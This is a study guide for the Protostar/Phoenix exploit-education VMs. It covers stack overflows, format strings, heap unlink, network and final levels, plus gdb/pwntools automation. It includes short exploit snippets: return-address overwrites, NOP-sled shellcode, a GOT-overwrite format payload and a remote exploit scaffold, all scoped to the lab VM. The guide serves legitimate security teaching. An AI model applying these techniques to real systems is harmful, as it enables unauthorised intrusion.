# Protostar / Phoenix — full guide

Single reference for **[Protostar](https://exploit.education/protostar/)** (historical) and **[Phoenix](https://exploit.education/phoenix/)** (maintained). Official level text stays on Exploit Education; this document teaches **methods** only.

## How to use

1. VM from [Exploit Education — Downloads](https://exploit.education/downloads/).
2. Work **modules 0→5** in order the first time; skip around later by weakness.
3. Use **§ Appendix** for gdb batching / Python automation.

## Contents

| # | Section |
|---|---------|
| — | [Overview and pacing](#overview-and-pacing) |
| 0 | [Orientation & tooling](#module-0--orientation--tooling) |
| 1 | [Stack exploitation](#module-1--stack-exploitation) |
| 2 | [Format strings](#module-2--format-string-exploitation) |
| 3 | [Heap exploitation](#module-3--heap-exploitation) |
| 4 | [Network exploitation](#module-4--network-exploitation) |
| 5 | [Final levels](#module-5--final-levels-integration) |
| A | [Appendix: GDB automation & Python](#appendix-gdb-automation--python-fast-workflows) |

---

## Overview and pacing

These modules support 32-bit Linux userspace exploitation practice on the official VMs.

| Module | Levels (Protostar names) | Est. time |
|--------|---------------------------|-----------|
| 0 | — | 2–4 h |
| 1 | Stack Zero → Stack Seven | 15–30 h |
| 2 | Format Zero → Format Four | 10–20 h |
| 3 | Heap Zero → Heap Three | 15–35 h |
| 4 | Net Zero → Net Two | 8–15 h |
| 5 | Final Zero → Final Two | 10–20 h |

- **Part-time (~6 h/week):** one module every 2–4 weeks.
- **Sprint (~20 h/week):** stack + format in ~2 weeks; full arc ~6–8 weeks.

**Also in this repo:** [Exercises overview](../README.md) · [Cryptopals index](../cryptopals/challenges.md)

---

# Module 0 — Orientation & tooling

## Objectives

By the end of this module you can:

- Boot the Protostar or Phoenix VM, find level binaries, and run them as intended.
- Use `file`, `strings`, and `objdump` for a **first-pass** map of a 32-bit Linux ELF.
- Start **gdb**, set breakpoints, step machine instructions, and inspect the stack in **hex**.
- Name the roles of `EIP`, `ESP`, `EBP`, and the **saved return address** on x86.

## Prerequisites

- Basic C (arrays, `strcpy`-style APIs, `malloc`/`free` names only; you will *see* bugs before you deeply understand allocators).
- Comfortable in a Linux shell.

## Reading (before lab)

- Skim a **32-bit x86 calling convention** cheat sheet (cdecl: arguments on stack, caller cleans up).
- Read the Protostar **“Getting started”** and **core files** notes on [exploit.education/protostar](https://exploit.education/protostar/).

## Lab setup checklist

1. Confirm VM networking (host-only / NAT) if you will use remote exploits later.
2. Locate the challenge directory described on the site (e.g. under `/opt/protostar/bin` on the historical VM).
3. Optional: copy one **non-final** binary to your host for static analysis only; **solve on the VM** so libc and config match.

---

## Diagrams: CPU, `CALL` / `RET`, and stack growth

**Registers (32-bit x86):** `EAX EBX ECX EDX ESI EDI EBP ESP EIP` — `EIP` = next instruction, `ESP` = stack pointer.

```
     time --->
  +-----------+-----------+-----------+-----------+
  | fetch     | decode    | execute   | writeback |   (simplified pipeline)
  | EIP ----+ |           |           |           |
  +---------+-+-----------+-----------+-----------+
            v
        [ bytes at EIP ]     e.g. push ebp / mov eax, 1
```

```
   CALL target                 RET
   --------                    ---
   push return_address         pop EIP  (jump back)
   EIP = target
```

**Stack direction** (caller frame + callee `vuln`): high address at top, buffer fills toward lower addresses.

```
  CALLER's stack (high addr)
  +------------------------+
  | ... caller's locals ...|
  | return addr to main ----+----> pushed by CALL to vuln
  +------------------------+
  | saved EBP (old)        |  ^
  |------------------------|  |  vuln frame
  | buffer[...]            |  |
  +------------------------+  v
  lower address
```

---

## Static analysis commands (terminal)

```text
$ file ./binary
ELF 32-bit LSB executable, Intel 80386, ...

$ checksec ./binary    # if installed: RELRO, NX, PIE
$ objdump -d ./binary | less
$ objdump -d ./binary | grep -E '<main|vuln|win>'
$ strings ./binary | less
```

Hex-check a payload piped to stdin:

```text
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*16)' | xxd
```

**Faster repeat runs:** see [§ Appendix](#appendix-gdb-automation--python-fast-workflows) (`gdb -ex`, `gdb.debug`).

---

## gdb walkthrough — first session (60–90 min)

Work on **any** small level binary inside the VM.

### Find `main` and the vulnerable `call`

```text
$ gdb -q ./binary
(gdb) break main
(gdb) run < /dev/null
(gdb) disassemble main
```

Locate the **call** to the function that does `gets` / `read` / `strcpy` / bad `printf`.

### Break and single-step

```text
(gdb) break vulnerable_fn      # or: break *0x08048xyz
(gdb) run
(gdb) stepi                    # repeat: one machine insn
(gdb) finish                   # run until current function returns
```

### Inspect the stack (map saved EBP and return address)

```text
(gdb) info registers esp ebp eip
(gdb) x/16wx $esp
(gdb) x/s $esp                 # string view if applicable
```

After you understand one frame, you’ve hit the **deliverable** sketch below.

---

## Mastery checks

- You can explain **why** overflow goes toward **higher** or **lower** addresses on the stack sketch (draw it).
- You can find `main` and the **vulnerable function** in `disassemble` output without symbols (recognize `call` targets).
- You can enable **ASLR off** only in environments where the course expects it (note: Protostar VM is preconfigured; do not blindly disable ASLR on real machines).

## Deliverable

One-page notes: your gdb command list + this **canonical stack frame** (same picture as Module 1 uses for overflows):

```
    Higher address
  +---------------------------+
  | return address (4 B)      |
  | saved EBP (4 B)           |
  +---------------------------+
  | locals / buffers          |  <- ESP usually near here
  +---------------------------+
    Lower address
```


[01-stack.md](01-stack.md)

---

# Module 1 — Stack exploitation

**Levels:** Stack Zero → Stack Seven ([Protostar stack section](https://exploit.education/protostar/))

## Objectives

- Correlate **C source patterns** (`gets`, `strcpy`, bounded reads with off-by-one) with **assembly** and stack layout.
- Compute or discover **offset** to the saved return address using patterns, debugging, or scripting (e.g. **cyclic** payloads outside the VM is fine).
- **Redirect execution** to a chosen address (function, shellcode region, or later ROP gadget) when ASLR/NX match the VM’s teaching assumptions.
- Use **core dumps** when the VM routes them to `/tmp` (see site notes).

---

## Diagrams: overflow layout & little-endian

**Frame you will overwrite** (32-bit):

```
    Higher address
  +---------------------------+
  | env / argv copies ...     |
  +---------------------------+
  | return address (4 B)      |  <-- target after padding
  | saved EBP (4 B)           |
  +---------------------------+
  | local var 2               |
  | local buf[N]              |  <-- overflow starts here → grows down
  +---------------------------+
    Lower address   <--- ESP
```

**Packing** `0x0804a1b2` on the wire / in a byte string (least-significant byte first):

```text
  B2 A1 04 08
```

---

## gdb walkthrough — crashes, cores, and `EIP`

### Inspect stack after a bad payload

```text
(gdb) info registers esp ebp eip
(gdb) x/24wx $esp
(gdb) x/16bx $ebp-32
```

### After SIGSEGV (still inside gdb)

```text
(gdb) info registers eip
(gdb) backtrace
```

### Core in `/tmp` (Protostar-style)

```text
$ gdb ./stack1 /tmp/core.... 
(gdb) bt
(gdb) info registers
```

### Offset from a pattern (`EIP` holds cyclic data)

Read `eip` in gdb, then in Python (host or VM):

```text
# example EIP holds 0x6b616161
python3 -c "from pwn import *; print(cyclic_find(0x6b616161))"
```

Or use `cyclic_find(p32(eip_int))` for unambiguous endianness.

---

## pwntools patterns (stack levels)

Install: `pip install pwntools` (modern Python; host is OK if the exploit talks **remote** to the VM).

**Context + 32-bit pack:**

```python
from pwn import *
context.update(arch="i386", os="linux", endian="little", log_level="debug")
payload = b"A" * 64 + p32(0x08049123)
```

**Local process:**

```python
p = process("./stack1")
p.sendline(b"A" * 76 + p32(0x080484b4))
print(p.recvall(timeout=2))
```

**Generate / decode cyclic:**

```python
pattern = cyclic(200)
# after crash:
offset = cyclic_find(0x6b616161)
log.info("offset = %d", offset)
```

**Shellcode** (only if the VM really has an executable stack — verify with `vmmap` / `checksec`):

```python
context.arch = "i386"
sc = asm(shellcraft.i386.linux.sh())
payload = b"\x90" * 40 + sc  # NOP sled + shellcode; ret addr → sled/buffer
```

**Automation:** [§ Appendix](#appendix-gdb-automation--python-fast-workflows) — `gdb.debug(..., gdbscript=...)` for a one-command edit/run loop.

---

## Suggested lesson sequence

Treat each level as one **session** (1–3 hours). Early levels can be paired.

### Lesson 1.1 — Stack Zero (overwriting locals)

**Focus:** stack **below** saved return address; observing memory with gdb.

**Activities**

1. Identify the **local buffer** and the **target variable** in disassembly.
2. In gdb: break before and after the read; `x/s` and `x/wx` to watch the target change.
3. Build the smallest payload that flips the target without crashing.

**Mastery:** predict **byte count** before running the exploit; explain endianness only if the target is multi-byte.

### Lesson 1.2 — Stack One (first return-address overwrite)

**Focus:** distance to **saved EIP**; little-endian **address packing**.

**Activities**

1. Draw stack frame: buffer → saved ebp → **return address**.
2. Use pattern or manual filling to find offset (document the method you used).
3. Redirect to a **non-main** function supplied by the challenge (verify address with `objdump` / gdb).

**Mastery:** one clean Python or bash one-liner that injects payload (pwntools optional).

### Lesson 1.3 — Stack Two (environment / repeated runs)

**Focus:** reading challenge text carefully; **reliable** payload delivery.

**Activities**

1. Trace **all** code paths; ensure you trigger the vulnerable read in the right state.
2. Stabilize exploit (sleep, loop, or argv vs stdin as required).

**Mastery:** exploit works **three runs in a row** cold.

### Lesson 1.4 — Stack Three (function pointers on stack or nearby)

**Focus:** **data** vs **code** addresses; calling convention when jumping to `win()`-style helpers.

**Activities**

1. Locate **where** the function pointer lives relative to the buffer.
2. Overwrite with address of provided **target function**; verify with `info break`/`x`.

**Mastery:** explain in one paragraph why jumping “into the middle” of a function can fail (prologue assumptions).

### Lesson 1.5 — Stack Four / Five / Six ( escalating control )

**Focus:** larger gadgets: **ROP** precursors, stub **shellcode** regions, or **nop sled** thinking per VM layout.

**Activities** (adapt per official level)

1. Map **readable/writable/executable** regions only as the VM allows (historical Protostar often relaxes protections—**verify on your image**).
2. If shellcode: assemble minimal **execve** shellcode or reuse provided stubs; **never** run raw shellcode from untrusted sources on a networked host.
3. If multiple stages: split plan into **stage 1: leak / fixup**, **stage 2: transfer** (even if this level only needs one stage).

**Mastery:** written exploit with comments mapping each 4-byte word to a **semantic** goal (“padding”, “saved ebp filler”, “ret addr”, etc.).

### Lesson 1.6 — Stack Seven (often **ROP**-shaped on modern layouts)

**Focus:** **return-oriented programming** mindset: reuse instruction snippets ending in `ret`.

**Activities**

1. List gadgets with `objdump` (manual) or a gadget finder (if allowed in your learning rules).
2. Chain: parameter setup → `call`-like behavior via gadgets.
3. Debug one gadget at a time in gdb (`break *addr`).

**Mastery:** diagram of gadget chain with **stack picture** after each `ret`.

## Cross-cutting labs

| Skill | Drill |
|--------|--------|
| Pattern offset | Crash with pattern; read `eip` / offset from core or gdb |
| Endian packing | Convert `0x0804abcd` to 4 bytes on paper |
| Reliability | Script sends payload + sleeps; parse success string |

## Assessment rubric (self-grade)

- **Novice:** needs hints for offset each time.
- **Competent:** finds offset independently on vanilla stack levels.
- **Strong:** adapts method when input is filtered or size-limited (without peeking at writeups).

## Safety

Exploit code is for **the VM only**. Do not point prototypes at daemons on your LAN.


[02-format-strings.md](02-format-strings.md)

---

# Module 2 — Format string exploitation

**Levels:** Format Zero → Format Four ([Protostar format section](https://exploit.education/protostar/))

## Objectives

- Explain how **`printf(user_input)`** differs from **`printf("%s", user_input)`**.
- Use **format specifiers** (`%x`, `%s`, `%n`, positional args) to **read** and **write** memory deliberately.
- Target **GOT entries**, **function pointers**, or **saved return addresses** when the level permits.
- Combine format bugs with **stack layout knowledge** from Module 1.

---

## Diagrams: format string vs normal argument

**Safe:**

```c
printf("%s", user);   // user is DATA
```

**Dangerous:**

```c
printf(user);         // user is FORMAT — %x leaks, %n writes
```

**Varargs on the stack (conceptual):** `printf(fmt, a, b)` places `fmt, a, b...` in reachable slots; your injected `%k$x` **indexes** which slot to read. That **index** is what pwntools `fmtstr_payload(..., offset=k)` calls `offset` — **not** the byte distance into your buffer.

```
  stack grows -->
  [ fmt ptr ] [ arg1 ] [ arg2 ] ...   <- printf walks these for %x %s %n
```

---

## gdb walkthrough — format levels

```text
(gdb) break main
(gdb) run
(gdb) break printf         # libc printf (noisy) OR break *0x... user call only
(gdb) continue
```

After `%s` crash:

```text
(gdb) bt
(gdb) print (char*)$eax    # arch-dependent: find bad pointer used as %s
```

Tune the breakpoint to the **callsite** in the challenge binary (one `disassemble` around the vulnerable `call`).

---

## pwntools — probe & automated writes

**Leak stack words:**

```python
from pwn import *
p = process("./format0")
p.sendline(b"%x.%x.%x.%x.%x")
print(p.recvline())
```

**Writes** once you know parameter index `k`:

```python
from pwn import *
puts_got = 0x0804a00c
win_addr = 0x080484b4
payload = fmtstr_payload(offset=7, writes={puts_got: win_addr})
proc = process("./format2")
proc.sendline(payload)
print(proc.recvall(timeout=2))
```

(`offset=7` means your `%7$hhn`-style math lines up — **discover with** `%1$p`, `%2$p`, … until you see your buffer’s marker.)

---

## Concept map

1. **Leak** — arbitrary read to defeat ASLR hints (less central on Protostar VM; still practice the skill).
2. **Write** — `%n` family writes **four bytes** (or variants) at an address you place in the attack string / stack.
3. **Width fields** — craft exact **counts** so the written value matches a chosen address.

## Lesson sequence

### Lesson 2.1 — Format Zero (crash / observe)

**Focus:** proof that **format string is not a normal string**.

**Activities**

1. Feed `%x.%x.%x` and map output to **stack slots**.
2. Identify how many “arguments deep” your controlled buffer appears (parameter index).

**Mastery:** predict first three leaked words as **hex** before running (rough guess OK first time).

### Lesson 2.2 — Format One / Two (directed reads/writes)

**Focus:** placing **pointers** in the buffer; `%s` safety vs **controlled** pointers.

**Activities**

1. Leak a **known** global (compare to `objdump` / nm).
2. Perform a **small** arbitrary write to flip a **test flag** or similar.

**Mastery:** one table: “specifier → effect on stack machine → max damage”.

### Lesson 2.3 — Format Three / Four (precision writes)

**Focus:** **multi-step** writes, splitting 32-bit targets into bytes (`%hhn` family if available on your libc/tooling in the VM).

**Activities**

1. Write **two different** non-zero words to two addresses (order matters—low vs high writes).
2. Stabilize padding so counts do not drift with environment changes.

**Mastery:** script prints **only** the format payload (easy to diff in git).

## gdb techniques

- `break printf` (libc) to watch **varargs** (advanced) or stay at user `_printf` callsites.
- After crash from `%s` on bad pointer: recognize **SIGSEGV** cause in **one** sentence.

## Common pitfalls lesson (15 min)

- Off-by-one in **parameter index** after **your** string bytes shift the stack.
- Confusing **addresses on stack** vs **addresses in your buffer** when using direct parameter access (`%7$x` style).

## Assessment

- **Pass:** solve Format Three Four without a video walkthrough; document your **parameter index** discovery method.
- **Stretch:** refactor exploit into a function `write_u32(addr, value)` reusable across levels.


[03-heap.md](03-heap.md)

---

# Module 3 — Heap exploitation

**Levels:** Heap Zero → Heap Three ([Protostar heap section](https://exploit.education/protostar/))

## Objectives

- Describe **chunks**, **metadata**, and the **freelist** at a **cartoon** level accurate enough to predict **unlink**-class bugs on older allocators.
- Use **gdb** to print chunks: boundaries, headers, **fd/bk** pointers when visible.
- Plan **allocation sequences** (`malloc`/`free` order) to place ** attacker-controlled data** next to a **victim** chunk.

---

## Diagrams: adjacent heap chunks

Heap tends to grow toward **higher** addresses; layout is **allocator-specific** (Protostar-era glibc differs from today). Cartoon for overflow thinking:

```
   heap  ---->

  +--------+--------+--------+--------+
  | hdr A  | USER A | hdr B  | USER B |
  +--------+--------+--------+--------+
                     ^
        overflow USER A can stomp hdr B or USER B
```

There is no `print heap` in vanilla gdb. Map the heap region:

```text
(gdb) info proc mappings
(gdb) x/64wx 0x080xxxxxx    # start at heap-ish region after a few mallocs
```

If you use **pwndbg / GEF / peda**, `vmmap` highlights `[heap]` — still verify with `x/` after each allocation step in your notes.

---

## Prerequisite mini-review

- Module 1 stack diagrams (you will reuse **pointer overwrite** thinking).
- Read the VM’s **glibc / dlmalloc** era notes if the site provides them; otherwise note your **Ubuntu/glibc** version inside the VM.

## Lesson sequence

### Lesson 3.1 — Heap Zero (allocator basics)

**Focus:** **overflow from chunk A into chunk B’s metadata or user data**.

**Activities**

1. Trace each `malloc` size; `x/32wx` heap region after each allocation.
2. Identify **which** field you corrupt and what the program does on **next free or malloc**.

**Mastery:** sketch heap **before** and **after** corruption.

### Lesson 3.2 — Heap One / Two (action at a distance)

**Focus:** **function pointers**, **virtual table**-like structures on the heap, or **double free** precursors depending on official level.

**Activities**

1. Write an **allocation script** (order matters) — table with columns: step, API, size, note.
2. Tie corruption to a **specific** branch (e.g. calls indirect pointer).

**Mastery:** explain failure if **order** of two frees swaps (predict crash vs silent wrong behavior).

### Lesson 3.3 — Heap Three (classic dlmalloc **unlink** intuition)

**Focus:** **FD/BK** pointer corruption; why “fake chunk” placement is fragile.

**Activities**

1. Draw **unsafe unlink** assuming 32-bit, two pointers, and `chunk->fd->bk == chunk`.
2. In gdb, break on `_int_free` or `free` and verify **which checks** trigger on your corrupt chunk.

**Mastery:** two paragraphs: legitimate unlink vs **attacker-controlled** unlink outcome.

## Tools (optional)

- **Graphic paper** beats fancy scripts early.
- Python **pwntools** `.heap` helpers may **not** match older allocators—prefer gdb + manual notes first.

## Safety note

Heap techniques differ wildly by **libc version**. Skills transfer; **offsets and integrity checks** do not. Always re-derive on the **target** VM.

## Assessment

- **Pass:** three running pages: allocation log, gdb session log, final exploit with **commented** sizes.
- **Stretch:** reproduce the same bug class on a **tiny toy allocator** in C (educational, <200 lines).


[04-network.md](04-network.md)

---

# Module 4 — Network exploitation

**Levels:** Net Zero → Net Two ([Protostar net section](https://exploit.education/protostar/))

## Objectives

- Explain **TCP client** vs **server** roles; map **recv/send** loops to familiar **stack** read primitives.
- Handle **binary I/O**: `send` raw bytes, **no accidental newline** truncation unless protocol expects `\n`.
- Reason about **endianness** when integers cross the wire (`htons` / `htonl` patterns in disassembly).
- Attach **gdb to a network daemon** in the VM (attach by PID or run under gdb with port binding as allowed).

---

## Diagrams: TCP + binary payloads

```
  [ EXPLOIT (pwntools on host or VM) ]     [ TARGET VM ]
        |                                       |
        |-------- TCP connect(host, port) ---->|
        |-------- send(raw bytes) ----------->|
        |<------- recv(banner / response) -----|
```

**No automatic `\0`** — build binary chunks with `p32` / `flat`. If the protocol uses **big-endian** lengths:

```python
p32(n, endian="big")
```

**Quick listener** (when you play server):

```text
nc -v -l -p 4444
```

**Watch bytes** (if allowed on VM): `tcpdump -X -i lo port 2993` (example).

---

## pwntools — remote scaffolding

```python
from pwn import *
context.arch = "i386"

host, port = "192.168.56.101", 2993
io = remote(host, port)
io.recvuntil(b"some banner\n")
io.send(p32(0xdeadbeef) + payload)   # example: header word + body (no extra newline)
io.interactive()
```

Use **`send`** (not `sendline`) when `\n` must **not** appear. Match the protocol’s `recv` size from **disassembly** of `read`/`recv`.

---

## Lesson sequence

### Lesson 4.1 — Net Zero (protocol framing)

**Focus:** **minimal** client; understand **message boundaries**.

**Activities**

1. `netcat` vs Python `socket` — send identical bytes; diff with `tcpdump -X` (if permitted on VM).
2. Document **exact** recv sizes from disassembly (constant vs read loop).

**Mastery:** your exploit script prints a **hexdump** of the first handshake you send.

### Lesson 4.2 — Net One (stack over the network)

**Focus:** classic **overflow** where input arrives on a **socket**.

**Activities**

1. Port your **Module 1** workflow: find offset remotely — **crash → pattern → ret addr** using **remote** gdb or reproducible core on VM.
2. Align payload with any **banner** reads (`recvuntil` pattern in pwntools).

**Mastery:** exploit works from **host to VM IP** (not only localhost on VM console).

### Lesson 4.3 — Net Two (endian / structured fields)

**Focus:** multi-field protocols; **length fields**; traps when **length ≠ sizeof**.

**Activities**

1. Tabulate on-wire layout: field name, type, endian, value range.
2. Fuzz **one byte at a time** in the header to map parser branches in gdb.

**Mastery:** explain **one** realistic bug class (e.g. trusting client length) in a real protocol as **bonus** reading (HTTP, DNS sketch OK).

## gdb attachment lab

1. Start daemon as usual in VM.
2. `ps aux | grep binary` → `gdb -p PID` (may need privileges on some levels).
3. Break **before** vulnerable `recv`; `continue` as your exploit sends.

## Assessment

- **Pass:** Net Two solved with **remote** script + 10-line **protocol doc**.
- **Stretch:** add **timeout + reconnect** logic; handle partial `recv`.

## Ethics checkpoint

Never aim these techniques at **third-party** hosts. Scope stays **VM IP inside your lab network**.


[05-final.md](05-final.md)

---

# Module 5 — Final levels (integration)

**Levels:** Final Zero → Final Two ([Protostar final section](https://exploit.education/protostar/))

## Objectives

- Combine **two or more** primitive families (e.g. leak + overflow, heap grooming + format, net + heap).
- Operate with **reduced hints**: fewer symbols, maybe **strip**ped binaries — rely on **behavior** and **strings**.
- Produce **repeatable** exploit scripts with clear **failure modes**.

## Assumptions

- You completed or are comfortable skipping back to refresh **Modules 1–4** topics as needed.
- You may use **root / debug** affordances the site documents for **final** debugging only.

---

## Command checklist (full chain)

Use this as a **final-level** triage script (expand/trim per binary):

1. **Static:** `file`, `strings`, `objdump -d`, optional `checksec`.
2. **Dynamic:** gdb → break before bad read → `x/xx $esp` / heap `x/` after `malloc`.
3. **Offset:** cyclic or manual fill → `EIP` or fault PC → `cyclic_find`.
4. **Payload:** `flat()` / `p32()`; recheck with gdb **one** stop before the crash.
5. **Net:** `remote()` exact lengths; correct endian on length fields.
6. **Heap:** log allocation order; corrupt **then** trigger `free`/`malloc` in gdb.

**Automation:** [§ Appendix](#appendix-gdb-automation--python-fast-workflows) for `-x` command files, embedded `import gdb`, and `gdb.debug`.

---

## Lesson sequence

### Lesson 5.1 — Final Zero (scoping the beast)

**Focus:** **recon** sprint — 90 minutes wall clock.

**Activities**

1. `strings`, `objdump -R` (relocs), `readelf -s` if symbols exist.
2. Write **threat model** in five bullets: entry points (argv, env, network, files), trust boundaries, likely bug class.
3. Choose **one** primary hypothesis; spend remaining time validating or falsifying in gdb.

**Deliverable:** one-page **recon memo** PDF/Markdown in `protostar/final/`.

### Lesson 5.2 — Final One (multi-stage plan)

**Focus:** decompose into **Stage A / B / C** even if you only need two.

**Activities**

1. Identify **prerequisite memory state** (heap shape, open FDs, libc base if partial).
2. If a **leak** exists: script prints leaked value and **derives** a second address mathematically.
3. Add **assertions** in exploit (e.g. `assert len(payload) == N`).

**Mastery:** exploit tolerates **one** unrelated environment change (e.g. argv length +1) without silent hang — or you document why not possible.

### Lesson 5.3 — Final Two (hardening & writeup)

**Focus:** **reliability**, **cleanup**, **notes for future you**.

**Activities**

1. Run exploit **10 times**; record success count; fix flakiness (sleep, alignment, `shutdown` vs `close`).
2. Write a **postmortem**: root cause in **C one-liner**, fix in **C one-liner**, exploit **overview diagram**.

**Deliverable:** `WRITEUP.md` suitable for a **job discussion** (no illegal disclosure of third-party systems).

## Rubric (mentor-style)

| Criterion | Weak | Strong |
|-----------|------|--------|
| Recon | jumps to random overflow | explains **why** bug exists in source pattern |
| gdb use | single breakpoint spam | **systematic** memory state tracking |
| Code | one-off hex paste | **parameterized** exploit with comments |
| Ethics | vague scope | explicit **lab-only** scope statement |

## Capstone reflection

Answer in writing:

1. Which **single** skill from Modules 1–4 mattered most here?
2. What would **ASLR + NX + PIE** break in your current exploit chain?
3. What **defensive** coding change closes the root cause?

## Course complete (Protostar arc)

Celebrate, then either:

- Move to **[Phoenix](https://exploit.education/phoenix/)** with modern mitigations in mind, or
- Parallel **Cryptopals** for crypto depth ([`../cryptopals/challenges.md`](../cryptopals/challenges.md)).

---

# Appendix: GDB automation & Python (fast workflows)

Use inside your **lab VM** only. Two main approaches:

1. **Python inside GDB** — `gdb` embeds a Python interpreter; your script drives `gdb.execute()`, reads registers, sets breakpoints with callbacks.  
2. **Python outside GDB** — `pwntools` starts or attaches to the process and passes a **`gdbscript`** string so everything happens in one `python exploit.py` run.

Older Protostar-era VMs may ship **gdb + Python 2**; newer distros use **Python 3**. In gdb, run `python print(sys.version)` after `python import sys` to see which you have.

---

## 1. One-liners from the shell (no `.py` file)

Batch commands without entering the TUI:

```bash
gdb -q ./binary \
  -ex "break main" \
  -ex "run" \
  -ex "info registers eip esp ebp" \
  -ex "x/16wx \$esp" \
  -ex "quit"
```

**`-ex`** runs each line like typing at `(gdb)`. Escape `$` in shells as `\$esp`.

**Command file** (replayable):

```bash
cat > /tmp/gdbcmds.txt <<'EOF'
break *0x080484b4
commands
silent
printf "EIP=%#x ESP=%#x\n", $eip, $esp
x/8wx $esp
continue
end
run
EOF

gdb -q ./binary -x /tmp/gdbcmds.txt
```

`commands` … `end` attaches **actions** that run every time that breakpoint hits (pure gdb, no Python yet).

---

## 2. Python **inside** gdb (embedded API)

Start gdb, then:

```text
(gdb) python import gdb
(gdb) python gdb.execute("break main")
(gdb) python gdb.execute("run")
(gdb) python print(gdb.parse_and_eval("$eip"))
```

### 2.1 Read registers and memory as integers

```python
python
import gdb
eip = int(gdb.parse_and_eval("$eip"))
esp = int(gdb.parse_and_eval("$esp"))
inferior = gdb.selected_inferior()
mem = inferior.read_memory(esp, 64)  # 64 bytes from ESP
print(eip, esp, mem.tobytes().hex())
end
```

### 2.2 `StopEvent` hook — run Python on **every** stop

Save as `hooks.py` and `source hooks.py` from gdb, or paste once per session:

```python
python
import gdb

class RegDump(gdb.Command):
    """Dump regs + stack top on each stop (toggle with regdump-on / regdump-off)."""
    enabled = True

    def __init__(self):
        gdb.Command.__init__(self, "regdump-toggle", gdb.COMMAND_USER)

    def invoke(self, arg, from_tty):
        RegDump.enabled = not RegDump.enabled
        print("regdump", "ON" if RegDump.enabled else "OFF")

RegDump()

def _on_stop(event):
    if not RegDump.enabled:
        return
    gdb.execute("printf \"\\n--- stop: EIP=%#x ESP=%#x ---\\n\", $eip, $esp", to_string=False)
    gdb.execute("x/8wx $esp", to_string=False)

gdb.events.stop.connect(_on_stop)
end
```

Then:

```text
(gdb) source hooks.py
(gdb) break main
(gdb) run
```

### 2.3 Breakpoint subclass — auto-actions in Python

```python
python
import gdb

class BreakOnRet(gdb.Breakpoint):
    def stop(self):
        gdb.write("HIT %s at %s\n" % (self.location, gdb.selected_frame().name() or "?"))
        gdb.execute("x/4wx $esp")
        return False  # False = do not stop to prompt (like "continue")
        # True  = stop as normal

BreakOnRet("vuln")
gdb.execute("run")
end
```

Use `return True` when you want the interactive stop.

### 2.4 `gdb.execute(..., to_string=True)` — parse output in Python

```python
python
import gdb
out = gdb.execute("info registers eip esp", to_string=True)
print(out)
end
```

---

## 3. Standalone `.py` file launched by gdb

```bash
gdb -q ./binary -ex "source myhelpers.py" -ex "run"
```

`myhelpers.py` uses the same `import gdb` blocks as above.

**Auto-load for one binary** (optional):

```gdb
# .gdbinit snippet
python
def register_binary_event():
    def on_new_objfile(event):
        path = event.new_objfile.filename or ""
        if path.endswith("stack1"):
            gdb.execute("source /home/user/myhelpers.py")
    gdb.events.new_objfile.connect(on_new_objfile)
register_binary_event()
end
```

(Paths are VM-specific; keep it simple and `source` manually while learning.)

---

## 4. pwntools: `gdb.debug` and `gdb.attach` (Python outside gdb)

Runs the target under gdb from your exploit script — best **fast loop** for local work.

### 4.1 Launch under gdb with a script block

```python
from pwn import *

context.arch = "i386"
context.terminal = ["tmux", "splitw", "-h"]  # optional: new tmux pane for gdb

gdbscript = """
break main
continue
break vuln
commands
silent
printf "ESP=%#x\\n", $esp
x/20wx $esp
continue
end
continue
"""

io = gdb.debug("./stack1", gdbscript=gdbscript)
io.sendline(cyclic(120))
io.interactive()
```

**`gdb.debug`** returns a tube (like `process`) plus manages gdb. `continue` lines matter: gdb stops at first `break`; script resumes to next break.

### 4.2 Attach to PID (daemon already running)

```python
from pwn import *

pid = 12345  # from pgrep
gdb.attach(pid, gdbscript="""
break *0x08048aa0
continue
""")
```

Or attach to a **pwntools process**:

```python
p = process("./service")
gdb.attach(p, gdbscript="break main\ncontinue")
```

### 4.3 `gdb_args` for ASLR off in the **child** (local testing)

```python
io = gdb.debug("./bin", gdbscript="continue", gdb_args=["-q", "--args"])
```

Tuning depends on gdb version; check `help gdb.debug` in pwntools for your install.

---

## 5. Cyclic + gdb without mental math

```python
from pwn import *

context.arch = "i386"
pat = cyclic(200)
io = gdb.debug("./stack1", gdbscript="continue")
io.sendline(pat)
io.wait()
# In gdb after SIGSEGV:
# (gdb) python print(cyclic_find(int(gdb.parse_and_eval("$eip"))))
```

If EIP only contains **partial** pattern bytes, use the **little-endian** word:

```python
eip_val = 0x6b616161  # from gdb
print(cyclic_find(p32(eip_val)))  # pwntools outside gdb
```

---

## 6. Faster edit–run loop (practical)

| Goal | Pattern |
|------|---------|
| Same gdb commands every time | `-x cmds.gdb` or `gdbscript=` in pwntools |
| Dump stack on each step | `gdb.events.stop` hook (embedded Python) |
| Re-run exploit + break | one Terminal tab: `python exp.py`; pwntools opens gdb |
| No tmux | omit `context.terminal`; gdb may use default terminal or run in same window |

---

## 7. Pitfalls

- **Escaping**: shell eats `$` — use single-quoted `-ex 'printf "%#x", $eip'` or `\$eip`.  
- **Python 2 vs 3** in gdb: `print` is a statement in py2; use `from __future__ import print_function` for compatibility or stick to `gdb.write()`.  
- **`gdb.execute("run")`** inside a **stop** hook can recurse — prefer **`continue`** or set flags to avoid loops.  
- **Remote** targets: embedded Python still works if gdb talks to a remote server; Protostar is usually **local remote** (qemu/gdbstub) or **attach on VM** — keep scope **lab only**.

---

## See also

- ASCII, gdb transcripts, pwntools patterns: [Module 1 — Stack exploitation](#module-1--stack-exploitation) (and earlier modules for orientation / format / heap / net).
